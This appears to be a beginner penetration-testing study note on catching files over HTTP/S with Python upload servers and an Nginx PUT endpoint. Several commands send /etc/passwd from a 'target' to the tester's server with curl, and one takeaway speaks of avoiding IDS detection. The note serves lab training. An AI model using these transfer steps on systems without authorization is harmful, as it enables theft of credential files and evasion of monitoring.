---
tags: [module/file-transfers, http, https, nginx, file-upload, web-server, level/beginner]
---

# Catching Files over HTTP/S - Beginner's Guide

## Why Use HTTP/HTTPS for File Transfers?

HTTP and HTTPS are the most common protocols allowed through firewalls. Almost every network permits outbound web traffic.

**Benefits:**
- Usually allowed through firewalls
- HTTPS provides encryption in transit
- Simple to set up
- Works with standard tools (curl, wget, browser)

**The Rule:** Never transfer sensitive files over plain HTTP if you can avoid it. Always use HTTPS when possible.

---

## The Encryption Imperative

> "There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption."

**Always encrypt sensitive data or use HTTPS.**

---

## Simple HTTP Server with Python

For quick transfers, Python's built-in HTTP server works:

### Python 3

python3 -m http.server 8000

### Python 2

python2 -m SimpleHTTPServer 8000

### Download from Target

wget http://YOUR-IP:8000/file.txt
curl -o file.txt http://YOUR-IP:8000/file.txt

**Limitation:** Only supports GET (downloads), not uploads.

---

## Simple Upload Server with Python

For uploads, use the uploadserver module:

### Install

pip3 install uploadserver

### Start Server

python3 -m uploadserver

### Upload from Target

curl -X POST http://YOUR-IP:8000/upload -F 'files=@/etc/passwd'

---

## Nginx Server with PUT Support

Nginx is more robust than Python's simple server and can be configured to accept file uploads via PUT requests.

### Step 1: Create Upload Directory

sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

### Step 2: Create Nginx Configuration

Create file: /etc/nginx/sites-available/upload.conf

server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

### Step 3: Enable the Site

sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

### Step 4: Remove Default Site (if port 80 in use)

sudo rm /etc/nginx/sites-enabled/default

### Step 5: Start/Restart Nginx

sudo systemctl restart nginx

### Step 6: Test Upload

curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

### Step 7: Verify Upload

sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt

---

## Troubleshooting Nginx

### Check for Errors

tail -2 /var/log/nginx/error.log

### Check What's Using Port 80

ss -lnpt | grep 80
ps -ef | grep [PID]

### Common Issue: Port Already in Use

If port 80 is taken, either:
- Use a different port (like 9001 in the example)
- Stop the service using port 80
- Remove default Nginx config

---

## Security Considerations

### Directory Listing

With Apache, if you browse to a directory without an index file, it lists all files. This is BAD for sensitive files.

**Nginx is better:** Directory listing is not enabled by default.

### Authentication

For production, add authentication:

location /SecretUploadDirectory/ {
    root /var/www/uploads;
    dav_methods PUT;
    auth_basic "Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd;
}

### HTTPS

Always use HTTPS for sensitive data:

server {
    listen 9001 ssl;
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}

---

## Tool Comparison

| Tool | Download | Upload | HTTPS | Ease of Setup |
|------|----------|--------|-------|---------------|
| Python HTTP server | ✅ | ❌ | ❌ | Very Easy |
| Python uploadserver | ✅ | ✅ | ❌ | Easy |
| Nginx (PUT) | ✅ | ✅ | ✅ | Moderate |
| Apache | ✅ | ✅ | ✅ | Complex |

---

## Key Takeaways

- HTTP/HTTPS are most likely to be allowed through firewalls
- Use HTTPS for sensitive data (encryption in transit)
- Python's http.server is quick for downloads only
- Python's uploadserver adds upload capability
- Nginx with PUT is robust and production-ready
- Always check what's using ports before starting
- Directory listing is a security risk - disable it
- Test with curl -T for PUT uploads
- Verify files uploaded successfully
- Remove default configs that may conflict
- Practice these setups in the lab
- Never let IDS catch you transferring plaintext sensitive data
